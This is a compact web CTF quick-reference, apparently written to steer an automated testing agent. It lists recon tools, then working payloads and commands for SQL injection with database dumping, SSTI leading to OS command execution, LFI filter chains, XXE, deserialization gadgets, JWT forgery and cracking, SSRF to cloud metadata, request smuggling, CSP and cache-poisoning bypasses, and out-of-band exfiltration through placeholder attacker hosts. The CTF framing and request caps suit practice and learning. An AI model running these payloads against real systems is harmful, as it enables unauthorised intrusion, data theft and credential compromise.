# web-ctf SUMMARY (quickref)

Fingerprint: `whatweb -v $URL` + `wafw00f $URL` + headers/cookies/errors.
Enum: `ffuf -w common.txt -u $URL/FUZZ -mc 200,301,302,403 -t 40` OR `feroxbuster -u $URL -w common.txt -x php,txt,bak,zip,js -t 30`.
Light: `nikto -h $URL -Tuning 2,4`; `nuclei -u $URL -severity low,medium`.
Probe sensitive: `/robots.txt /.git/HEAD /.env /openapi.json /graphql`,
  `/swagger.json /api-docs /server-status /actuator *.js.map`.
Matrix per top-3 params (cap 40): reflect `XSSCHECK` -> quote-break `'` -> boolean `AND 1=1/1=2` -> time `SLEEP(5)` (1 shot) -> path/OOB/template.
Negatives (cap 15): benign resend + `zzqq99zz` + double-encode + polarity
  flip (`{{7*8}}`->`56`); any fail = unconfirmed, no exploit.
SSTI detect: `{{7*7}}` vs `{{7*'7'}}`; confirm `{{7*8}}` -> `56`.
SQLi auto: `sqlmap -u "$URL?id=1" --batch --level 2 --risk 1 -p id --dbs`;
  WAF: `--tamper=space2comment,randomcase,between`; dump: `-D $DB -T $TABLE --dump`.
NoSQLi: `{"$ne":null}` / `user[$ne]=x`; `$regex` prefix extract; `$where` sleep.
XSS: `dalfox url "$URL?q=test"` (or `dalfox scan ...` new CLI);
  blind: `--blind https://$OOB_HOST`; stored: re-check trigger page.
SSTI: `python3 tplmap.py -u "$URL?name=John"` then `--os-cmd 'id'`;
  SSTImap: `python3 sstimap.py -u ... -S 'id'` / `-D '/etc/passwd' './passwd'`.
LFI: `php://filter/convert.base64-encode/resource=index.php`;
  filter-chain via stacked `convert.iconv.*`; log-poison ONLY if confirmed.
SSRF: Collaborator first; then `169.254.169.254` metadata (AWS/GCP/Azure headers); bypasses: `0x7f.0.0.1`, `2130706433`, `@`-tricks, `%09`.
XXE: benign `<!ENTITY x "XXECHECK">` first; then `file:///` /
  `php://filter` b64 / XInclude; OOB last.
Deser: local `pickletools.dis(b64decode(cookie))`; PHP `O:...` + `phar://`;
  Java `rO0AB` magic, ysoserial chain gated; Node `__proto__` pollution probe.
JWT: `python3 jwt_tool.py $JWT` -> `-C -d rockyou.txt` / `-X k -pk pub.pem`
  / `-S hs256 -p "$SECRET"`; `hashcat -m 16500 jwt.txt rockyou.txt`;
  try `none`, `kid` SQLi/path, `jku`/`x5u` in that order.
Flask: `--decode` -> `--unsign --wordlist rockyou.txt --no-literal-eval`
  -> `--sign --secret 'KEY'`.
GraphQL: `{__schema{types{name}}}` -> batching -> depth cap.
CMDi: `;id` ladder (`|`, `$()`, `${IFS}`, `{cat,/etc/passwd}`), gated 1 shot.
Upload: `GIF89a <?php echo "UPLOADCHECK"; ?>` marker first; matrix ext/MIME/magic; double-ext `.jpg.php`.
Auth: IDOR `/api/user/1..5` (cap 10); OTP batch; race `xargs -P5` (x5 only);
  reset: `Host:` / `X-Forwarded-Host: attacker.com`; OAuth redirect check.
CHAIN A1 SSRF->meta->JWT: OOB `https://$OOB_HOST/ssrf-<cid>` first (no hit=no pivot);
  bypass `0x7f.0.0.1`/`2130706433`/`127.1` one/req; meta single-shots AWS/GCP(+`Metadata-Flavor: Google`)/Azure(+`Metadata: true`); forge once.
WAF grammar: case/`/**/`/VT-FF -> Content-Type swap (json vs form vs multipart)
  -> dup `boundary=`/RFC2231 cont. -> dup keys `\u0027` -> HPP split `?id=1+union&id=/select+1,2,3`;
  `sqlmap --tamper=space2comment,randomcase,between` first.
SMUGGLE: CL.TE/TE.CL/TE.TE/H2.CL/H2.TE/H2.0/CL.0/0.CL; obfuscate (`chunkedx`, obs-fold,
  dup CL); time-confirm only, max 10 probes; header-smuggle `X-Forwarded-Host/Scheme`, `X-Original-URL`.
OOB: unique `<cid>`/probe; benign `<cid0>` control; DNS labels hex<=32; `interactsh-client -o out.json`; cap 30/secret.
SECOND-ORDER: marker `SOCHECK<cid>` in every writable field, crawl all read/admin/export paths;
  fire order XSS->SQLi->SSTI/formula; cap 20 cycles, cleanup after.
RACE: 10x latency p50/p95 first (jitter>window=stop); `seq 1 5 | xargs -P5` ONE burst/idea, 10-wide max; 429=stop 10min.
CSP: enforcing header only; `unsafe-inline`->inline, gadget host->JSONP `<script src>`,
  `data:`->data-URI, `strict-dynamic`->nonce-reuse ONLY if reflected, missing `base-uri`->`<base>` hijack;
  `nuclei -t csp-bypass -dast -headless`.
CACHE->XSS: buster pair proves HIT; unkeyed `X-Forwarded-Host`/`utm_source` reflected+HIT=poisonable;
  benign `POISON<cid>` first, then XSS; note TTL (`Age`).
FAILURES: F1 silent-drop(time>>base)=grammar ladder; F2 2x429=stop 10min; F3 401+new-cookie=re-login+mini-baseline;
  F4 no-bot-hit-2min=1 resubmit then operator; F5 json-vs-form=keep executing parse; F6 stale-HIT=always `?cb=`; F7 `&lt;`=downgrade.
DRIFT: `--help` gate/session/tool + `--version` in flagpath; `nuclei -update-templates`; `dalfox scan` (not `url`); tplmap `--os-cmd` vs SSTImap `-S`.
TIERS: easy<=15m(40req no-oracle=stop); medium<=45m(Phase3 fail=blocked); hard<=2h(2 branches+1 chain, 3xF=escalate); insane=package+escalate.
ESCALATE: /forensics=own-pcap smuggle/OOB proof; chaining-flagpath=>=2 prims no-solo-flag; operator=CAPTCHA/2FA/destructive/scope.
MODERN: RSC/Next (`Next-Action`, `/_next/`) vs CVE-2025-55182/66478 version-gated; `__proto__` pollution via Playwright;
  WS paths from JS bundles; GraphQL intro->batch->1x depth probe; PDF-renderer SSRF decode-quirks.
GATE: Phase 4 = ONE exploit <=120s <=20 req. Then validate: replay raw,
  `grep -E -o` flag pattern, `flagpath.json`, causality re-check.
Burp MCP: proxy `:8080`, Repeater/Intruder sniper 1 param (50 max, 200ms).
Playwright MCP: render DOM, drive login/OTP/upload, 30s page timeout.
Caps: P1 30req/60s, P2 40, P3 15, total <=120. 2x429/WAF-block -> stop.
W1 NFKC: `%E2%80%98` -> `'` + `/**/`; Go-SSTI: `{{((index .Posts 0).Author).ChangePassword "X"}}`.
W6 split-brace: half1 `{{ ... ~ '` + half2 `' }}`; W7 blind: `{% if ...startswith('X') %} found {% endif %}`.
W11 filter-chain: `php_filter_chain_generator.py --chain '<?php system("cat /flag*");?>'`.
W13 phar: `avatar=phar://<up>` + JPG stub `__HALT_COMPILER`; W12 htaccess split `SetHa`+`ndler`.
W20 kid: `' UNION SELECT 'k','k','k';--` sign `-p k`; W21 jku: host `{"keys":[...]}` + `kid/jku/sub` sign.
W31 smuggle: `?token=%0aContent-Length:0%0aConnection:keep-alive%0a%0aGET /add-token...`.
W33 CSS: `body:has(script[nonce^="a"]){background:url(OOB/a)}`; W34 JPEG-JS: `img_polygloter.py jpg --payload`.
W35 YAML: `yaml: !!python/object/apply:subprocess.getoutput ['ls']` b64 path; W38 PP: `{"constructor":{"prototype":{"env":{"PATH":"/app/data/pp"}}}}`.
R2 W39-W48: 0.CL `%s`+ERG; WS-101 `Sec-WebSocket-Version: 13`+smuggle; CVE-2023-25690 `%0D%0A`; PCRE-flood 383838x; multipart-split; jku-redirect `startsWith`-bypass; jku-Host; OTP `includes([1000..])`; GQL 10k-alias; suggestion-`Did you mean`.
R2 W49-W58: PP `NODE_OPTIONS --require /proc/self/environ`; CSP-redirect Angular `data-ng-app`; JSONP `callback=`; meta-refresh to no-CSP `/api/notes`; smuggle→cache; WCD `/imgs`; IMDSv2 `instance-data`+PUT; SNI-301+multiline; Jersey `;.`+`INI\T`; Fury-MapProxy二次.
R2 W59-W68: lockfile `-P2`+`max_input_vars` CSP-drop; OAuth `../post/next?path=`+`temp_token`; CSWSH `READY`+`btoa`; Thymeleaf `MethodUtils.invokeMethod`; `escapeHTML`+`<!--NL-->`; CVE-2024-2961 `ISO-2022-CN-EXT`; `LD_PRELOAD`+`mail`; `ļ/ľ` overflow; XFF `ESCAPE ''`; hash-ext+`["fl'||","'ag"]`.
R2 files: techniques/writeup-patterns-r2-1.md (W39-48), r2-2.md (W49-58), r2-3.md (W59-68); manifest R2 450 hard (web-ctf_manifest_r2.md).
Sources: github.com/sqlmapproject/sqlmap, ffuf/ffuf, epi052/feroxbuster,
  hahwul/dalfox, epinna/tplmap, vladko312/SSTImap, ticarpi/jwt_tool,
  Paradoxis/Flask-Unsign, projectdiscovery/nuclei+templates+interactsh;
  owasp.org, cheatsheetseries.owasp.org, portswigger.net/web-security,
  rfc-editor.org/rfc/rfc8725.html, react.dev/blog, nextjs.org/blog.
